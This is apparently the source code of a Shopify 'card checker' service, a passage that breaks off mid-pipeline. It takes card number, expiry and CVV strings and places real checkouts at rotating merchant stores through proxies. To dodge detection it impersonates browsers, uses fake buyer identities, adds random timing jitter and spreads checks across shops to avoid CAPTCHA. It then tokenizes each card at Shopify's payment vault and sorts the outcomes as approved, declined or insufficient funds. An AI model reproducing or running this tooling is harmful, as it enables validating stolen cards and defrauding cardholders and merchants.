"""
app.py — Shopify Checkout Node (Render / scale plan)

All fixes applied:
  • BUDGET_SEC = 40 (freeze fix)
  • Code alias in _resp / _resp_poll / _resp_submit (for run.py display)
  • NO_RECEIPT bug fixed (rss fallback to session_token)
  • Full PollForReceipt raw body always returned
  • 3DS_REQUIRED, not ORDER_PLACED (approved=False on ActionRequiredReceipt)
  • CAPTCHA_REQUIRED explicit classification
  • Cookie warm-up (Step 0) — establishes _shopify_y / _shopify_s / _secure_session_id
  • Full sec-ch-ua headers on every GraphQL call
  • Human jitter between steps
  • Strict 25s poll window + per-request budget cap
  • One shop per check (_USED_SHOPS dedup, recycles only when exhausted)
  • _release_shop() on cart timeout only
  • /sites exposes shops_used_this_cycle / cap_warning
"""
import os
import re
import html
import json
import time
import uuid
import random
import string
import threading
import urllib3

from flask import Flask, request, jsonify
from curl_cffi import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# ⚙️ ENV & CONFIG
# ─────────────────────────────────────────────────────────────────────────────
WORKERS_CAP = int(os.environ.get("WORKERS_CAP", "20"))
BUDGET_SEC  = float(os.environ.get("BUDGET_SEC", "40"))   # was 60 → 40 (freeze fix)


# ─────────────────────────────────────────────────────────────────────────────
# 📦 PRODUCT LOADING + SHOP DEDUPLICATION
# ─────────────────────────────────────────────────────────────────────────────
_PRODUCTS_LIST = []
_PRODUCT_POOL  = []
_PRODUCT_LOCK  = threading.Lock()

_USED_SHOPS      = set()
_USED_SHOPS_LOCK = threading.Lock()


def _load_products():
    global _PRODUCTS_LIST
    file_path = os.path.join(os.path.dirname(__file__), "products.txt")
    if not os.path.exists(file_path):
        return
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            for line in f:
                m = re.search(r'ID:\s*(\d+)\s*\|\s*\$?([\d.]+)\s*\|.*?\|\s*(https?://[^\s|]+)', line)
                if m:
                    try:
                        price_val = float(m.group(2))
                    except ValueError:
                        price_val = 0.0
                    if price_val < 1.00:
                        continue
                    _PRODUCTS_LIST.append({
                        "vid":   m.group(1),
                        "price": str(m.group(2)),
                        "shop":  m.group(3).strip().rstrip('/'),
                    })
        if _PRODUCTS_LIST:
            unique_shops = {p["shop"] for p in _PRODUCTS_LIST}
            print(f"[NODE] Loaded {len(_PRODUCTS_LIST)} products | "
                  f"{len(unique_shops)} unique shops", flush=True)
            if len(unique_shops) < 3:
                print(f"[NODE] ⚠️  Only {len(unique_shops)} unique shops — "
                      f"concurrency > {len(unique_shops)} WILL trigger CAPTCHA", flush=True)
    except Exception as e:
        print(f"[NODE] Error loading products.txt: {e}", flush=True)


_load_products()


def _get_next_product():
    global _PRODUCT_POOL, _PRODUCTS_LIST
    with _PRODUCT_LOCK:
        if not _PRODUCTS_LIST:
            return None

        if not _PRODUCT_POOL:
            _PRODUCT_POOL = list(_PRODUCTS_LIST)
            random.shuffle(_PRODUCT_POOL)

        remaining = len(_PRODUCT_POOL)
        while _PRODUCT_POOL and remaining > 0:
            prod = _PRODUCT_POOL.pop()
            remaining -= 1
            with _USED_SHOPS_LOCK:
                if prod["shop"] not in _USED_SHOPS:
                    _USED_SHOPS.add(prod["shop"])
                    return prod

        # Cycle exhausted — reset
        _PRODUCT_POOL = list(_PRODUCTS_LIST)
        random.shuffle(_PRODUCT_POOL)
        with _USED_SHOPS_LOCK:
            _USED_SHOPS.clear()

        if _PRODUCT_POOL:
            prod = _PRODUCT_POOL.pop()
            with _USED_SHOPS_LOCK:
                _USED_SHOPS.add(prod["shop"])
            return prod
        return None


def _release_shop(shop_url):
    """Only for network failures (cart timeout). Never for CAPTCHA / 3DS."""
    with _USED_SHOPS_LOCK:
        _USED_SHOPS.discard(shop_url)


_GRAPHQL_CACHE = {}
_GRAPHQL_LOCK  = threading.Lock()


# ─────────────────────────────────────────────────────────────────────────────
# ⚡ STATE, COUNTER & LOGGING
# ─────────────────────────────────────────────────────────────────────────────
_workers_busy = 0
_workers_lock = threading.Lock()


def _inc_busy():
    global _workers_busy
    with _workers_lock:
        _workers_busy += 1


def _dec_busy():
    global _workers_busy
    with _workers_lock:
        _workers_busy = max(0, _workers_busy - 1)


_last_failure = {}
_check_logs   = []
_log_lock     = threading.Lock()


def log(msg):
    global _check_logs
    with _log_lock:
        _check_logs.append(f"[{time.strftime('%H:%M:%S')}] {msg}")
        if len(_check_logs) > 400:
            _check_logs.pop(0)
    print(msg, flush=True)


def _fail(reason, **extra):
    global _last_failure
    _last_failure = {"reason": reason, "ts": int(time.time()), **extra}
    log(f"❌ [FAIL] {reason} | {extra}")
    return _resp(f"PROPOSAL_FAILED_{reason}")


# ─────────────────────────────────────────────────────────────────────────────
# ⚡ IDENTITIES & PROXY
# ─────────────────────────────────────────────────────────────────────────────
BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "chrome110", "edge101", "safari15_5"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
]
FIRST_NAMES   = ["james", "john", "robert", "michael", "william", "david", "richard", "joseph", "thomas", "charles"]
LAST_NAMES    = ["smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis", "rodriguez", "martinez"]
EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]

ADDRESSES = [
    {"street":"100 SW Main St",           "city":"Portland",  "state":"OR","zip":"97204","phone":"+15035550100"},
    {"street":"223 Pioneer Blvd",         "city":"Salem",     "state":"OR","zip":"97301","phone":"+15035550101"},
    {"street":"101 N Last Chance Gulch",  "city":"Helena",    "state":"MT","zip":"59601","phone":"+14065550100"},
    {"street":"1 Granite St",             "city":"Concord",   "state":"NH","zip":"03301","phone":"+16035550100"},
    {"street":"100 W 10th St",            "city":"Wilmington","state":"DE","zip":"19801","phone":"+13025550100"},
    {"street":"500 5th Ave",              "city":"New York",  "state":"NY","zip":"10110","phone":"+12125550100"},
    {"street":"200 W Madison St",         "city":"Chicago",   "state":"IL","zip":"60606","phone":"+13125550100"},
]


def _identity():
    fn = random.choice(FIRST_NAMES)
    ln = random.choice(LAST_NAMES)
    email = f"{fn.lower()}.{ln.lower()}{random.randint(1,9999)}@{random.choice(EMAIL_DOMAINS)}"
    return fn, ln, email, random.choice(ADDRESSES)


def _street_addr(fn, ln, a):
    return {
        "address1": a["street"], "city": a["city"], "countryCode": "US",
        "postalCode": a["zip"],  "firstName": fn,    "lastName": ln,
        "zoneCode": a["state"],  "phone": a["phone"],
    }


def _rand_suffix(n=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _parse_proxy(s):
    if not s:
        return ""
    p = s.strip()
    for scheme in ("socks5://", "socks5h://", "http://", "https://"):
        if p.startswith(scheme):
            p = p[len(scheme):]
            break
    if "@" in p:
        return f"socks5h://{p}"
    parts = p.split(":")
    if len(parts) == 2:
        return f"socks5h://{parts[0]}:{parts[1]}"
    if len(parts) >= 4:
        host, port, user = parts[0], parts[1], parts[2]
        return f"socks5h://{user}:{':'.join(parts[3:])}@{host}:{port}"
    return f"socks5h://{p}"


# ─────────────────────────────────────────────────────────────────────────────
# 🔍 EXTRACTIONS
# ─────────────────────────────────────────────────────────────────────────────
def _session_token(h):
    for pat in (r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
                r'"sessionToken"\s*:\s*"([^"]+)"',
                r'"checkoutSessionToken"\s*:\s*"([^"]+)"'):
        m = re.search(pat, h)
        if m:
            t = html.unescape(m.group(1)).strip('"\'')
            if len(t) > 30:
                return t
    return ""


def _commit_sha(h):
    m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', html.unescape(h))
    return m.group(1) if m else ""


def _stable_id(h):
    m = re.search(r'"stableId"\s*:\s*"([0-9a-f-]{36})"', html.unescape(h))
    return m.group(1) if m else ""


def _queue_token(b):
    m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', b)
    return m.group(1) if m else ""


def _receipt_id(b):
    m = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', b)
    return m.group(1) if m else ""


def _receipt_session(b):
    m = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', b)
    return m.group(1) if m else ""


def _code(b):
    m = re.search(r'"code"\s*:\s*"([^"]+)"', b)
    return m.group(1) if m else ""


def _checkout_total(b):
    m = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', b)
    return m.group(1) if m else ""


def _tax_amount(b):
    try:
        d = json.loads(b)
        sp = (d.get("data", {}).get("session", {}).get("negotiate", {})
              .get("result", {}).get("sellerProposal", {}))
        v2 = sp.get("tax", {}).get("totalTaxAmountV2", {}).get("amount")
        if v2:
            return v2
        return sp.get("tax", {}).get("totalTaxAmount", {}).get("value", {}).get("amount", "0.0")
    except Exception:
        return "0.0"


def _tax_from_rejected(b):
    try:
        d = json.loads(b)
        sp = d.get("data", {}).get("submitForCompletion", {}).get("sellerProposal", {})
        v2 = sp.get("tax", {}).get("totalTaxAmountV2", {}).get("amount")
        if v2:
            return v2
        return sp.get("tax", {}).get("totalTaxAmount", {}).get("value", {}).get("amount", "0.0")
    except Exception:
        return "0.0"


def _total_from_rejected(b):
    try:
        d = json.loads(b)
        sp = d.get("data", {}).get("submitForCompletion", {}).get("sellerProposal", {})
        v = sp.get("checkoutTotal", {}).get("amount")
        if v:
            return v
        for k in ("total", "runningTotal"):
            v = sp.get(k, {}).get("value", {}).get("amount")
            if v:
                return v
    except Exception:
        pass
    return ""


def _is_shipping_required(b):
    try:
        d = json.loads(b)
        sp = (d.get("data", {}).get("session", {}).get("negotiate", {})
              .get("result", {}).get("sellerProposal", {}))
        return sp.get("isShippingRequired", True)
    except Exception:
        return True


def _delivery_handle(b):
    try:
        d = json.loads(b)
        sp = (d.get("data", {}).get("session", {}).get("negotiate", {})
              .get("result", {}).get("sellerProposal", {}))
        sds = sp.get("selectedDeliveryStrategy", {})
        if isinstance(sds, dict) and sds.get("handle"):
            return sds["handle"]
        for dg in sp.get("deliveryGroups", []):
            for opt in dg.get("deliveryOptions", []):
                if isinstance(opt, dict) and opt.get("handle"):
                    return opt["handle"]
    except Exception:
        pass
    for pat in (r'"selectedDeliveryStrategy"\s*:\s*\{[^{}]*"handle"\s*:\s*"([^"]+)"',
                r'"__typename"\s*:\s*"CompleteDeliveryStrategy"[^{}]*"handle"\s*:\s*"([^"]+)"'):
        m = re.search(pat, b)
        if m:
            return m.group(1)
    return ""


def _signed_handles(b):
    try:
        d = json.loads(b)
        sp = (d.get("data", {}).get("session", {}).get("negotiate", {})
              .get("result", {}).get("sellerProposal", {}))
        de = sp.get("deliveryExpectations", {})
        if de.get("__typename") == "FilledDeliveryExpectationTerms":
            return [x["signedHandle"] for x in de.get("deliveryExpectations", []) if x.get("signedHandle")]
    except Exception:
        pass
    return []


def _payment_method_id(b):
    try:
        data = json.loads(b)
    except Exception:
        for pat in (r'"paymentMethodIdentifier"\s*:\s*"([^"]{4,})"',
                    r'"payment_method_identifier"\s*:\s*"([^"]{4,})"'):
            m = re.search(pat, b)
            if m:
                return m.group(1)
        return ""

    candidates = []

    def walk(o, ctx=""):
        if isinstance(o, dict):
            tn   = str(o.get("__typename", ""))
            name = str(o.get("name", "")).lower()
            v = o.get("paymentMethodIdentifier")
            if isinstance(v, str) and len(v) > 3:
                candidates.append((0, "shopify" in name, v))
            v = o.get("payment_method_identifier")
            if isinstance(v, str) and len(v) > 3:
                candidates.append((1, "shopify" in name, v))
            if "payment" in tn.lower() or "payment" in ctx.lower():
                for k in ("identifier", "handle", "paymentMethodId", "id"):
                    v = o.get(k)
                    if isinstance(v, str) and len(v) > 3 and not v.startswith("gid:"):
                        candidates.append((2, ("shopify" in name) or ("card" in name), v))
                        break
            for k, v in o.items():
                walk(v, tn or ctx)
        elif isinstance(o, list):
            for x in o:
                walk(x, ctx)

    walk(data)
    if not candidates:
        return ""
    candidates.sort(key=lambda c: (c[0], not c[1]))
    return candidates[0][2]


def _payment_method_id_from_html(h):
    h = h.replace('&quot;', '"').replace('&#34;', '"')
    for pat in (r'"paymentMethodIdentifier"\s*:\s*"([^"]{4,})"',
                r'"payment_method_identifier"\s*:\s*"([^"]{4,})"',
                r'paymentMethodId["\']?\s*[:=]\s*["\']([^"\']{4,})["\']'):
        m = re.search(pat, h)
        if m:
            return m.group(1)
    return ""


def _ident_sig(h):
    decoded = h.replace('&quot;', '"')
    for pat in [
        r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
        r'CardsinkCallerIdentificationSignature":"([^"]+)"',
        r'cardsinkCallerIdentificationSignature":"([^"]+)"',
        r'"identification_signature"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(pat, decoded)
        if m:
            return m.group(1)
    return ""


def _vault_url(h):
    decoded = h.replace('&quot;', '"')
    m = re.search(r'(https://[a-z0-9._-]*(?:shopifycs|shopifyinc)\.[a-z.]+/sessions)', decoded)
    if m:
        return m.group(1)
    hf = re.search(r'"hostedFields"[^}]*"url"\s*:\s*"(https://[^"]+)"', decoded)
    if hf:
        return hf.group(1).rsplit("/", 2)[0] + "/sessions"
    return ""


def _vault_domain(h):
    decoded = h.replace('&quot;', '"')
    m = re.search(r'hostedFieldsUrl[^}]+"domain"\s*:\s*"([^"]+)"', decoded)
    if m:
        return m.group(1)
    return ""


# ─────────────────────────────────────────────────────────────────────────────
# 🔑 GRAPHQL IDS
# ─────────────────────────────────────────────────────────────────────────────
def _graphql_ids(session, shop_url, checkout_html, ua, t_rem):
    with _GRAPHQL_LOCK:
        if shop_url in _GRAPHQL_CACHE:
            return _GRAPHQL_CACHE[shop_url]

    m = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)',
                  checkout_html)
    if not m:
        return None, None, None
    try:
        js = session.get(shop_url + m.group(1), headers={"user-agent": ua}, timeout=t_rem).text
        p = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js)
        s = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js)
        q = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"', js)
        res = (p.group(1) if p else None, s.group(1) if s else None, q.group(1) if q else None)
        if res[0] and res[1]:
            with _GRAPHQL_LOCK:
                _GRAPHQL_CACHE[shop_url] = res
        return res
    except Exception:
        return None, None, None


# ─────────────────────────────────────────────────────────────────────────────
# 🛒 PAYLOAD BUILDER
# ─────────────────────────────────────────────────────────────────────────────
def _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr,
                      proposal_id, use_lines=False, target_any=True):
    if addr:
        sa   = _street_addr(addr["fn"], addr["ln"], addr)
        dest = {"partialStreetAddress": {
            "address1": sa["address1"], "city": sa["city"],
            "countryCode": "US", "lastName": sa["lastName"],
            "phone": "", "oneTimeUse": False,
        }}
        bill = {"streetAddress": sa}
    else:
        dest = {"partialStreetAddress": {
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": False,
        }}
        bill = {"streetAddress": {"address1": "", "city": "", "countryCode": "US",
                                   "lastName": "", "phone": ""}}

    merch_key    = "lines" if use_lines else "merchandiseLines"
    target_lines = {"any": True} if target_any else {"lines": [{"stableId": stable_id}]}

    return {
        "variables": {
            "sessionInput": {"sessionToken": session_token},
            "queueToken":   None,
            "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {
                "deliveryLines": [{
                    "destination": dest,
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments":              {"any": True},
                        },
                        "options": {},
                    },
                    "targetMerchandiseLines": target_lines,
                    "deliveryMethodTypes":    ["NONE"],
                    "expectedTotalPrice":     {"any": True},
                    "destinationChanged":     True,
                }],
                "noDeliveryRequired":            [],
                "useProgressiveRates":           False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping":         True,
            },
            "deliveryExpectations": {"deliveryExpectationLines": []},
            "merchandise": {merch_key: [{
                "stableId": stable_id,
                "merchandise": {"productVariantReference": {
                    "id":                 f"gid://shopify/ProductVariantMerchandise/{vid}",
                    "variantId":          f"gid://shopify/ProductVariant/{vid}",
                    "properties":         [],
                    "sellingPlanId":      None,
                    "sellingPlanDigest":  None,
                }},
                "quantity":             {"items": {"value": 1}},
                "expectedTotalPrice":   {"any": True},
                "lineComponentsSource": None,
                "lineComponents":       [],
            }]},
            "memberships": {"memberships": []},
            "payment": {
                "totalAmount":    {"any": True},
                "paymentLines":   [],
                "billingAddress": bill,
            },
            "buyerIdentity": {
                "customer":          {"presentmentCurrency": currency, "countryCode": "US"},
                "email":             email or None,
                "emailChanged":      bool(email),
                "phoneCountryCode":  "US",
                "marketingConsent":  [],
                "shopPayOptInPhone": {"countryCode": "US"},
                "rememberMe":        False,
            },
            "tip":      {"tipLines": []},
            "poNumber": None,
            "taxes": {
                "proposedAllocations":           None,
                "proposedTotalAmount":           {"any": True},
                "proposedTotalIncludedAmount":   None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions":            [],
            },
            "note": {"message": None, "customAttributes": []},
            "localizationExtension": {"fields": []},
            "nonNegotiableTerms":    None,
            "scriptFingerprint": {
                "signature": None, "signatureUuid": None,
                "lineItemScriptChanges": [], "paymentScriptChanges": [],
                "shippingScriptChanges": [],
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
        },
        "operationName": "Proposal",
        "id": proposal_id,
    }


# ─────────────────────────────────────────────────────────────────────────────
# 🔑 PCI
# ─────────────────────────────────────────────────────────────────────────────
def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua,
              ident_sig="", vault_url="", vault_domain="",
              proxy_url="", t_rem=5):
    _DEFAULT_VAULT = "https://checkout.pci.shopifyinc.com/sessions"
    endpoint    = vault_url or _DEFAULT_VAULT
    scope       = vault_domain or shop_domain
    origin_base = (endpoint.rsplit("/sessions", 1)[0]
                   if "/sessions" in endpoint
                   else "https://checkout.pci.shopifyinc.com")

    payload = json.dumps({
        "credit_card": {
            "number":             ccn,
            "month":              int(mm),
            "year":               int(yyyy),
            "verification_value": cvv,
            "start_month":        None,
            "start_year":         None,
            "issue_number":       "",
            "name":               name,
        },
        "payment_session_scope": scope,
    })

    headers = {
        "accept":                    "application/json",
        "accept-language":           "en-US,en;q=0.9",
        "content-type":              "application/json",
        "origin":                    origin_base,
        "priority":                  "u=1, i",
        "referer":                   f"{origin_base}/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "sec-ch-ua":                 '"Chromium";v="124", "Not-A.Brand";v="24", "Google Chrome";v="124"',
        "sec-ch-ua-mobile":          "?0",
        "sec-ch-ua-platform":        '"Windows"',
        "sec-fetch-dest":            "empty",
        "sec-fetch-mode":            "cors",
        "sec-fetch-site":            "same-origin",
        "sec-fetch-storage-access":  "active",
        "shopify-identification-signature": ident_sig,
        "user-agent":                ua,
    }

    post_kwargs = {"data": payload, "headers": headers, "timeout": t_rem}
    if proxy_url:
        post_kwargs["proxy"] = proxy_url

    try:
        r = session.post(endpoint, **post_kwargs)
        if r.status_code == 200:
            return r.json().get("id")
        else:
            log(f"  Step 5: PCI HTTP {r.status_code}: {r.text[:100]}")
    except Exception as e:
        log(f"  Step 5: PCI EXC: {str(e)[:100]}")

    if "shopifyinc" in endpoint:
        return _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua,
                         ident_sig,
                         "https://checkout.pci.shopifycs.com/sessions",
                         vault_domain, proxy_url, t_rem)

    return None


# ─────────────────────────────────────────────────────────────────────────────
# 📤 RESPONSE HELPERS — all include "Code" alias for run.py display
# ─────────────────────────────────────────────────────────────────────────────
def _resp(response, *, charged=False, approved=False, price="0 USD", elapsed_ms=None):
    d = {
        "Response": response,
        "Code":     response,
        "Gate":     "Shopify Payments",
        "Charged":  "True" if charged  else "False",
        "Approved": "True" if approved else "False",
        "Price":    price,
        "success":  charged or approved,
    }
    if elapsed_ms is not None:
        d["Time"] = str(int(elapsed_ms))
    return jsonify(d)


def _resp_poll(raw_body, *, price="0 USD", poll_attempt=0, http_status=None,
               status="POLLFORRECEIPT", success=False, approved=False, charged=False,
               elapsed_ms=None):
    d = {
        "Response":   status,
        "Code":       status,
        "Gate":       "Shopify Payments",
        "Charged":    "True" if charged  else "False",
        "Approved":   "True" if approved else "False",
        "Price":      price,
        "success":    success,
        "PollAttempt": poll_attempt,
        "FullPollResponse": raw_body,
    }
    if http_status is not None:
        d["PollHttpStatus"] = http_status
    if elapsed_ms is not None:
        d["Time"] = str(int(elapsed_ms))
    return jsonify(d)


def _resp_submit(raw_body, *, price="0 USD", status="NO_RECEIPT", elapsed_ms=None):
    d = {
        "Response":  status,
        "Code":      status,
        "Gate":      "Shopify Payments",
        "Charged":   "False",
        "Approved":  "False",
        "Price":     price,
        "success":   False,
        "FullSubmitResponse": raw_body,
    }
    if elapsed_ms is not None:
        d["Time"] = str(int(elapsed_ms))
    return jsonify(d)


def _classify_failed(code):
    c = (code or "").upper()
    if "CAPTCHA" in c:                          return "CAPTCHA_REQUIRED",   False, False
    if "INSUFFICIENT" in c or c == "FUNDS":     return "INSUFFICIENT_FUNDS", True,  False
    if "GENERIC" in c:                          return "GENERIC_ERROR",      False, False
    if "EXPIRED" in c:                          return "CARD_EXPIRED",       False, False
    if "INVALID" in c:                          return "INVALID_CARD",       False, False
    if "BLOCKED" in c:                          return "BLOCKED_CARD",       False, False
    if "DECLINED" in c or "DO_NOT_HONOR" in c:  return "CARD_DECLINED",      False, False
    return (c or "CARD_DECLINED"), False, False


# ─────────────────────────────────────────────────────────────────────────────
# 🧠 PIPELINE
# ─────────────────────────────────────────────────────────────────────────────
def _run_check(card_str, proxy_str):
    t_start = time.monotonic()

    def elapsed():  return time.monotonic() - t_start
    def remain():   return BUDGET_SEC - elapsed()
    def t_max(sec): return max(1.0, min(sec, remain() - 1.0))

    parts = card_str.split("|")
    if len(parts) < 4:
        return _resp("INVALID_CARD")
    ccn, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    yyyy = "20" + yy if len(yy) == 2 else yy

    prod = _get_next_product()
    if not prod:
        return _fail("NO_PRODUCTS", reason="No products in products.txt")

    shop_url = prod["shop"]
    vid      = prod["vid"]
    price    = prod["price"] or "1.00"

    log(f"🃏 [START] {ccn[:6]}*** | Shop: {shop_url} | Vid: {vid}")

    proxy_url = _parse_proxy(proxy_str)
    ua        = random.choice(USER_AGENTS)
    imp       = random.choice(BROWSER_PROFILES)

    session = requests.Session(impersonate=imp)
    if proxy_url:
        session.proxies = {"http": proxy_url, "https": proxy_url}

    try:
        # ═══════════════════════════════════════════════════════════════
        # Step 0: Cookie warm-up
        # ═══════════════════════════════════════════════════════════════
        try:
            warm_hdr = {
                "accept":             "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "accept-language":    "en-US,en;q=0.9",
                "user-agent":         ua,
                "sec-ch-ua":          '"Chromium";v="124", "Not-A.Brand";v="24", "Google Chrome";v="124"',
                "sec-ch-ua-mobile":   "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest":     "document",
                "sec-fetch-mode":     "navigate",
                "sec-fetch-site":     "none",
                "upgrade-insecure-requests": "1",
            }
            log("  Step 0: Warm-up (homepage cookies)")
            session.get(shop_url + "/", headers=warm_hdr,
                        timeout=t_max(8), allow_redirects=True)
            time.sleep(random.uniform(0.4, 1.0))
            session.get(shop_url + "/", headers=warm_hdr,
                        timeout=t_max(8), allow_redirects=True)
            time.sleep(random.uniform(0.3, 0.7))
        except Exception as e:
            log(f"  Step 0: Warm-up EXC (non-fatal) -> {str(e)[:80]}")

        # ═══════════════════════════════════════════════════════════════
        # Step 1: Cart
        # ═══════════════════════════════════════════════════════════════
        cart_url = f"{shop_url}/cart/{vid}:1"
        r = None
        for cart_attempt in range(2):
            if remain() < 8:
                return _resp("BUDGET_LOW", price=f"{price} USD")
            try:
                log(f"  Step 1: Cart Request (attempt {cart_attempt+1}) -> {cart_url}")
                r = session.get(cart_url, headers={"user-agent": ua},
                                allow_redirects=True, timeout=t_max(10))
                log(f"  Step 1: Cart Status -> {r.status_code}")
                if r.status_code == 200:
                    break
            except Exception as e:
                log(f"  Step 1: Cart EXC (attempt {cart_attempt+1}) -> {str(e)[:100]}")
                if cart_attempt == 1:
                    _release_shop(shop_url)
                    return _resp("CART_FAILED", price=f"{price} USD")

        if not r or r.status_code != 200:
            _release_shop(shop_url)
            return _resp("CART_FAILED", price=f"{price} USD")

        checkout_url  = r.url
        checkout_html = r.text
        cart_token    = (re.search(r'/checkouts/(?:cn/)?([^/?]+)', checkout_url) or [None, ""])[1]

        session_token = _session_token(checkout_html)
        commit_sha    = _commit_sha(checkout_html)
        stable_id     = _stable_id(checkout_html)
        log(f"  Step 1: Session Token -> {'FOUND' if session_token else 'MISSING'}")
        log(f"  Step 1: Stable ID -> {'FOUND' if stable_id else 'MISSING'}")
        if not session_token: return _fail("NO_SESSION_TOKEN", shop=shop_url)
        if not commit_sha:    return _fail("NO_COMMIT_SHA",    shop=shop_url)
        if not stable_id:     return _fail("NO_STABLE_ID",     shop=shop_url)

        prop_id, submit_id, poll_id = _graphql_ids(session, shop_url, checkout_html, ua, t_rem=t_max(6))
        prop_id   = prop_id   or "6d9f0eb3d750c837c721c99da1ec1c7f1ce832d3687c5d0d0ffc1b42a610d3e8"
        submit_id = submit_id or "b3fd8db496438a6859c96db264b77e84b3f093d11a44c4d0a84d43e661f12419"
        poll_id   = poll_id   or "b99547c8e17e88f985ec0e11a844dd1305bf14cf70e41ca10954899050ffc567"

        currency = "USD"
        m = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', checkout_html)
        if m:
            currency = m.group(1)

        amount = price
        m = re.search(r'"runningTotal"\s*:\s*\{\s*"value"\s*:\s*\{"amount"\s*:\s*"([\d.]+)"', checkout_html)
        if m:
            amount = m.group(1)

        fn, ln, email, addr_raw = _identity()
        addr = {
            "fn": fn, "ln": ln,
            "street": addr_raw["street"], "city":  addr_raw["city"],
            "state":  addr_raw["state"],  "zip":   addr_raw["zip"],
            "phone":  addr_raw["phone"],
        }

        hdr = {
            "accept":                            "application/json",
            "accept-language":                   "en-US,en;q=0.9",
            "content-type":                      "application/json",
            "priority":                          "u=1, i",
            "sec-ch-ua":                         '"Chromium";v="124", "Not-A.Brand";v="24", "Google Chrome";v="124"',
            "sec-ch-ua-mobile":                  "?0",
            "sec-ch-ua-platform":                '"Windows"',
            "sec-fetch-dest":                    "empty",
            "sec-fetch-mode":                    "cors",
            "sec-fetch-site":                    "same-origin",
            "origin":                            shop_url,
            "referer":                           checkout_url,
            "shopify-checkout-client":           "checkout-web/1.0",
            "shopify-checkout-source":           f'id="{cart_token}", type="cn"',
            "user-agent":                        ua,
            "x-checkout-one-session-token":      session_token,
            "x-checkout-web-build-id":           commit_sha,
            "x-checkout-web-deploy-stage":       "production",
            "x-checkout-web-server-handling":    "fast",
            "x-checkout-web-server-rendering":   "yes",
            "x-checkout-web-source-id":          cart_token,
        }

        prop_url  = f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal"
        use_lines = False

        # ═══════════════════════════════════════════════════════════════
        # Step 2: Proposal 1 (empty)
        # ═══════════════════════════════════════════════════════════════
        try:
            log("  Step 2: Proposal 1 (Empty)")
            p  = _proposal_payload(session_token, stable_id, vid, amount, currency,
                                   None, None, prop_id, use_lines, target_any=True)
            r1 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(8))
            if r1.status_code == 200 and "INVALID_VARIABLE" in r1.text and "merchandiseLines" in r1.text:
                log("  Step 2: Swapping to 'lines' schema")
                use_lines = True
                p  = _proposal_payload(session_token, stable_id, vid, amount, currency,
                                       None, None, prop_id, use_lines, target_any=True)
                r1 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(8))
        except Exception as e:
            return _fail("P1_EXC", shop=shop_url, err=str(e)[:100])

        log(f"  Step 2: Proposal 1 Status -> {r1.status_code}")
        if r1.status_code != 200:
            return _fail("P1_HTTP", shop=shop_url, status=r1.status_code, body=r1.text[:800])

        queue_token = _queue_token(r1.text) or None
        if not queue_token:
            return _fail("P1_NO_QUEUE", shop=shop_url, body=r1.text[:800])

        # ═══════════════════════════════════════════════════════════════
        # Step 3: Proposal 2 (email)
        # ═══════════════════════════════════════════════════════════════
        try:
            log("  Step 3: Proposal 2 (Email)")
            p = _proposal_payload(session_token, stable_id, vid, amount, currency,
                                  email, None, prop_id, use_lines, target_any=True)
            p["variables"]["queueToken"] = queue_token
            r2 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(8))
        except Exception as e:
            return _fail("P2_EXC", shop=shop_url, err=str(e)[:100])

        log(f"  Step 3: Proposal 2 Status -> {r2.status_code}")
        if r2.status_code != 200:
            return _fail("P2_HTTP", shop=shop_url, status=r2.status_code, body=r2.text[:800])

        time.sleep(random.uniform(0.2, 0.6))

        # ═══════════════════════════════════════════════════════════════
        # Step 4: Proposal 3 (address / target item)
        # ═══════════════════════════════════════════════════════════════
        pm_id = ""; del_h = ""; signed = []
